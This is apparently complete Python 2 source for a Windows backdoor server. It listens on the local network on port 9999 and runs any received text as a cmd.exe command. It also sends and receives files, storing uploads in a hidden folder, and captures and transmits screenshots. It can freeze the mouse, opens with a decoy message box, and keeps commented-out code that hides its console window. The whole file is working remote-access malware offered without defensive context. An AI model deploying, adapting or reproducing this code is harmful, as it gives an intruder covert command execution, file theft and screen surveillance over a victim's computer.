# -*- coding: utf-8 -*-
import os
import sys
import socket
import threading
import ctypes 
from PIL import ImageGrab
import SocketServer
import time
import shutil


class MyTcpServer(SocketServer.BaseRequestHandler):

    def __init__(self):
        pass

    @staticmethod
    def lock_mouse():
        """lock the mouse"""
        try:
            start_time = time.time()
            end_time = int(start_time) + 10
            while time.time() < end_time:
                ctypes.windll.user32.SetCursorPos(0, 0)
        except Exception as e:
            print e
            return False
        finally:
            return True

    @staticmethod
    def cur_file_dir():
        #  获取脚本路径
        path = sys.path[0]
        #  判断为脚本文件还是py2exe编译后的文件，如果是脚本文件，则返回的是脚本的目录，如果是py2exe编译后的文件，则返回的是编译后的文件路径
        if os.path.isdir(path):
            return path
        elif os.path.isfile(path):
            return os.path.dirname(path)

    @staticmethod
    def screen_shoot():
        im = ImageGrab.grab()
        ISOTIMEFORMAT = '%H-%M-%S'
        screen_shoot_time = time.strftime(ISOTIMEFORMAT, time.localtime())
        if not os.path.exists("tmp"):
            os.mkdir("tmp")
        save_path = './tmp/' + screen_shoot_time + '.jpg'
        im.save(save_path)
        return save_path

    def receive_file(self, filename):
        print "starting receive file!"
        filename = filename.split('/')[-1]
        if not os.path.exists("QFileRcv"):
            os.mkdir("QFileRcv")
        command = "attrib +h ./QFileRcv"
        self.cmd_execute(command)
        filename = "./QFileRcv/"+filename
        try:
            f = open(filename, 'wb')
            self.request.send('ready')
            while True:
                data = self.request.recv(4096)
                if data == 'EOF':
                    print "recv file success!"
                    break
                f.write(data)
        except Exception as e:
            print e
        else:
            f.close()
        finally:
            pass
                                        
    def send_file(self, filename):
        """ send file """
        print "starting send file!"
        self.request.send('ready')
        time.sleep(1)
        try:
            f = open(filename, 'rb')
            while True:
                data = f.read(4096)
                if not data:
                    break
                self.request.send(data)
            f.close()
            time.sleep(1)
            self.request.send('EOF')
            print "send file success!"
        except Exception as e:
            print e
            time.sleep(1)
            self.request.send('error')
            print "send error!"

    @staticmethod
    def cmd_execute(command):
            command = 'cmd.exe /k ' + command
            result = os.popen(str(command)).readlines()
            result_str = ''
            for each in result:
                    result_str += each
            return result_str

    def handle(self):
        print ">>Listening......"
        print ">>get connection from :", self.client_address
        while True:
            try:
                request = self.request.recv(4096)
                print "[*] Received Command:%s" % request
                if not request:
                    print "break the connection!"
                    break
                else:
                    if request.split(' ')[0] == "put":
                        try:
                            self.receive_file(request.split(' ')[1])
                        except Exception as e:
                            print e
                    elif request.split(' ')[0] == "get":
                        try:
                            self.send_file(request.split(' ')[1])
                        except Exception as e:
                            print e
                    elif request.split(' ')[0] == "screen_shoot":
                        image_name = self.screen_shoot()
                        self.send_file(image_name)
                        time.sleep(1)
                        path = os.path.abspath(os.path.dirname(image_name))
                        shutil.rmtree(path)
                    elif request.split(' ')[0] == "lock":
                        threading.Thread(target=self.lock_mouse(), args=())
                        # self.request.send("success")
                    elif request.split(' ')[0] == "pwd":
                        res = self.cur_file_dir()
                        print res
                        self.request.send(res)
                    else:
                        res = self.cmd_execute(request)
                        if not res:
                            res = 'command error'
                        self.request.send(res)
                  
            except Exception as e:
                print "get error at:", e
                break


if __name__ == '__main__':
    # 隐藏自己
    # whnd = ctypes.windll.kernel32.GetConsoleWindow()    
    # if whnd != 0:    
    #     ctypes.windll.user32.ShowWindow(whnd,0)    
    #     ctypes.windll.kernel32.CloseHandle(whnd)   
    
    cmd = 'cmd.exe /k mshta vbscript:msgbox("Good Good Study,Day Day UP :) ",64,"title")(window.close)'
    os.popen(str(cmd))

    def get_local_ip():
        # 这个得到本地ips
        local_ip_list = socket.gethostbyname_ex(socket.gethostname())[-1]
        for ip in local_ip_list:
            if ip.split('.')[3] != '1':
                return ip
        return False
    
    # 监听的IP及端口
    host = '127.0.0.1'
    if get_local_ip(): 
        host = get_local_ip()
    port = 9999
    s = SocketServer.ThreadingTCPServer((host, port), MyTcpServer)
    s.serve_forever()
